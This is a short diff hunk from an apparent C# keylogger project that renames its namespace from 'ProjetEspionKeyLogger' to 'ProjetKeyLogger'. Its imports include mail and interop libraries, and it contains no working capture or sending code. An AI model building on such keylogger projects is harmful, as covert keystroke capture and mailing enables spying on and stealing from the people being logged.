@@ -10,7 +10,7 @@ using System.Runtime.InteropServices;
 using System.Net.Mail;
 using System.Threading;
 
-namespace ProjetEspionKeyLogger
+namespace ProjetKeyLogger
 {
     class KeyLogger
     {
